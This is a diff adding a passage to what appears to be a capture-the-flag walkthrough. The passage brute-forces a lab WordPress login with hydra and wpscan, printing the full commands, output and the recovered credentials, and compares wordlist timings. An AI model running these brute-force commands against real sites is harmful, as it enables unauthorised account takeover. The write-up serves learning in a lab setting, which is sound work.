@@ -1601,11 +1601,21 @@ and the return for the uniq.dic file is:
 <p></p>
 
 ```
+❯ hydra -l elliot -P uniq.dic 192.168.125.132 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect' -t 40
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-07-09 12:57:01
+[DATA] max 40 tasks per 1 server, overall 40 tasks, 11452 login tries (l:1/p:11452), ~287 tries per task
+[DATA] attacking http-post-form://192.168.125.132:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect
+[STATUS] 1040.00 tries/min, 1040 tries in 00:01h, 10412 to do in 00:11h, 40 active
+[STATUS] 1026.67 tries/min, 3080 tries in 00:03h, 8372 to do in 00:09h, 40 active
+[80][http-post-form] host: 192.168.125.132   login: elliot   password: ER28-0652
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-07-09 13:03:48
 ```
 
 <p></p>
-The time difference between these two dictionaries was XXXXXXX so you can see how refining your dictionaries saves considerable time.
+The time difference between these two dictionaries was nearly 7min so you can see how refining your dictionaries saves considerable time.
 <p></p>
 Next I will demonstrate using wpscan to bruteforce the login, the help page looks like this:
 <p></p>
@@ -1711,10 +1721,196 @@ Usage: wpscan [options]
 ```
 
 <p></p>
+The command we will use is fairly simple, it looks like this (we will use the uniq.dic to start):
+<p></p>
 
+```
+wpscan --url 192.168.125.132/wp-login.php -U elliot -P uniq.dic
+```
 
+<p></p>
+Which outputs:
+<p></p>
 
+```
+❯ wpscan --url 192.168.125.132/wp-login.php -U elliot -P uniq.dic
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
 
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.17
+                               
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[i] Updating the Database ...
+[i] Update completed.
+
+[+] URL: http://192.168.125.132/wp-login.php/ [192.168.125.132]
+[+] Started: Fri Jul  9 10:51:31 2021
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entries:
+ |  - Server: Apache
+ |  - X-Powered-By: PHP/5.5.29
+ |  - X-Mod-Pagespeed: 1.9.32.3-4523
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] WordPress readme found: http://192.168.125.132/wp-login.php/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] This site seems to be a multisite
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | Reference: http://codex.wordpress.org/Glossary#Multisite
+
+[+] The external WP-Cron seems to be enabled: http://192.168.125.132/wp-login.php/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 4.3.1 identified (Insecure, released on 2015-09-15).
+ | Found By: Query Parameter In Install Page (Aggressive Detection)
+ |  - http://192.168.125.132/wp-includes/css/buttons.min.css?ver=4.3.1
+ |  - http://192.168.125.132/wp-includes/css/dashicons.min.css?ver=4.3.1
+ | Confirmed By: Query Parameter In Upgrade Page (Aggressive Detection)
+ |  - http://192.168.125.132/wp-includes/css/buttons.min.css?ver=4.3.1
+ |  - http://192.168.125.132/wp-includes/css/dashicons.min.css?ver=4.3.1
+
+[i] The main theme could not be detected.
+
+[+] Enumerating All Plugins (via Passive Methods)
+
+[i] No plugins Found.
+
+[+] Enumerating Config Backups (via Passive and Aggressive Methods)
+ Checking Config Backups - Time: 00:00:02 <===============================================================================================================> (137 / 137) 100.00% Time: 00:00:02
+
+[i] No Config Backups Found.
+
+[+] Performing password attack on Wp Login against 1 user/s
+[SUCCESS] - elliot / ER28-0652                                                                                                                                                                
+Trying elliot / erased Time: 00:00:36 <====================================                                                                             > (5630 / 17081) 32.96%  ETA: ??:??:??
+
+[!] Valid Combinations Found:
+ | Username: elliot, Password: ER28-0652
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Fri Jul  9 10:52:12 2021
+[+] Requests Done: 5966
+[+] Cached Requests: 4
+[+] Data Sent: 2.095 MB
+[+] Data Received: 39.57 MB
+[+] Memory used: 257.938 MB
+[+] Elapsed time: 00:00:41
+```
+
+<p></p>
+You can see it has returned the password for us in 41 seconds. This is significantly quicker than hydra because it is purpose built for brute forcing word press.
+<br>
+Next we will see the time diference when we use the single.dic file.
+<p></p>
+
+```
+❯ wpscan --url 192.168.125.132/wp-login.php -U elliot -P single.dic
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.17
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://192.168.125.132/wp-login.php/ [192.168.125.132]
+[+] Started: Fri Jul  9 13:18:34 2021
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entries:
+ |  - Server: Apache
+ |  - X-Powered-By: PHP/5.5.29
+ |  - X-Mod-Pagespeed: 1.9.32.3-4523
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] WordPress readme found: http://192.168.125.132/wp-login.php/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] This site seems to be a multisite
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | Reference: http://codex.wordpress.org/Glossary#Multisite
+
+[+] The external WP-Cron seems to be enabled: http://192.168.125.132/wp-login.php/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 4.3.1 identified (Insecure, released on 2015-09-15).
+ | Found By: Query Parameter In Install Page (Aggressive Detection)
+ |  - http://192.168.125.132/wp-includes/css/buttons.min.css?ver=4.3.1
+ |  - http://192.168.125.132/wp-includes/css/dashicons.min.css?ver=4.3.1
+ | Confirmed By: Query Parameter In Upgrade Page (Aggressive Detection)
+ |  - http://192.168.125.132/wp-includes/css/buttons.min.css?ver=4.3.1
+ |  - http://192.168.125.132/wp-includes/css/dashicons.min.css?ver=4.3.1
+
+[i] The main theme could not be detected.
+
+[+] Enumerating All Plugins (via Passive Methods)
+
+[i] No plugins Found.
+
+[+] Enumerating Config Backups (via Passive and Aggressive Methods)
+ Checking Config Backups - Time: 00:00:02 <===============================================================================================================> (137 / 137) 100.00% Time: 00:00:02
+
+[i] No Config Backups Found.
+
+[+] Performing password attack on Wp Login against 1 user/s
+[SUCCESS] - elliot / ER28-0652                                                                                                                                                                
+Trying elliot / uHack Time: 00:00:00 <===========================================================                                                            > (10 / 20) 50.00%  ETA: ??:??:??
+
+[!] Valid Combinations Found:
+ | Username: elliot, Password: ER28-0652
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Fri Jul  9 13:18:39 2021
+[+] Requests Done: 330
+[+] Cached Requests: 4
+[+] Data Sent: 93.271 KB
+[+] Data Received: 615.207 KB
+[+] Memory used: 213.379 MB
+[+] Elapsed time: 00:00:04
+```
+
+<p></p>
+This achieved the brute force in 4 seconds. Proof that refining .dic files for brute forcing is essential if time is important.
+<p></p>
+Now that we have the username and password we can log in and have a look around.
 
 
 
